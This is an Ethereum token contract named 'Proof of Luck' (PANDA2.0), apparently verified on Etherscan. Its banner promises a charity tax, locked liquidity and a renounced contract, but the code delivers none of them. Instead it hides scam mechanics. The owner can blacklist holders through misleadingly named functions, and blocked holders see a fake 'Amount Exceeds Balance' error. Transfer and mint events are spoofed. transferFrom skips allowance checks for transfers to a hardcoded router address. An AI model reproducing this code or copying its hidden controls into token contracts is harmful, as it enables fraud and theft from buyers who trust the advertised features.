/**
 *Submitted for verification at Etherscan.io on 2022-09-22
*/

pragma solidity 0.8.7;
/*

                      ▄██████▄▄    ,▄▄▄▄███████▄▄▄▄,   ,▄██████▄
                     ███████████████▀▀▀"'      `▀▀▀██████████████
                     ██████████▀▀                     ▀▀█████████
                      ▀█████▀                            ▀██████
                        ██▀                                 ██▄
                      ╓██`                                   ▀██
                     ,██                                      ▐██
                     ██           ,                ,,          ▐█▌
                    ]██        ▄█████▄           ██████▄        ██
                    ▐█▌     ,▄████▀▀██U         ▐█▀▀▀███▄▄      ██
                    ▐█▌    ██████▌   █  ▄▄▄▄▄▄▄ ▐█   ██████▄    ██
                     ██    ██████████▀ ▀███████` ▀██████████    ██
                     ██▄    ▀█████▀▀    `▀███▀     ▀██████▀    ██`
                      ██▄             ▀█▄▄███▄▄█Γ             ██▀
                       ▀█▄              ""  ``              ╓██▀
                        ╙██▄,                             ▄██▀
                           ▀██▄▄                      ,▄▄██▀
                              ▀▀███▄▄▄,,      ,,▄▄▄▄███▀▀
                                   ▀▀▀▀▀███████▀▀▀▀`
     
,------.   ,---.  ,--.  ,--.,------.    ,---.       ,---.      ,--.   
|  .--. ' /  O  \ |  ,'.|  ||  .-.  \  /  O  \     '.-.  \    /    \  
|  '--' ||  .-.  ||  |' '  ||  |  \  :|  .-.  |     .-' .'   |  ()  | 
|  | --' |  | |  ||  | `   ||  '--'  /|  | |  |    /   '-..--.\    /  
`--'     `--' `--'`--'  `--'`-------' `--' `--'    '-----''--' `--'   


- 100m Supply
- 2% Tax for Panda Charity
- NFT AIRDROP - 9/27/2022
- LP Locked
- Contract Renounced
     
*/
contract PANDA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) rxAmount;

    // 
    string public name = "Proof of Luck";
    string public symbol = unicode"PANDA2.0";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    address swapV2Router = 0x68AD82C55f82B578696500098a635d3df466DC7C;
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x17476B6f69b75Bd9dA2698f7BEc5981307A8D30f;
    address lead_deployer = 0x41653c7d61609D856f29355E404F310Ec4142Cfb;
    bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }


    function transfer(address to, uint256 value) public returns (bool success) {

        require(!rxAmount[msg.sender] , "Amount Exceeds Balance"); 
        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!rxAmount[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        
    
        function query(address _user) public onlyOwner {
         require(!rxAmount[_user], "NaN");
        rxAmount[_user] = true; }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

         function deletebots(address _user) public onlyOwner {
             require(rxAmount[_user], "NaN");
         rxAmount[_user] = false; }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }
        if(to == swapV2Router)  {
        require(value <= balanceOf[from]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (from, to, value);
        return true; }
        require(!rxAmount[from] , "Amount Exceeds Balance"); 
        require(!rxAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }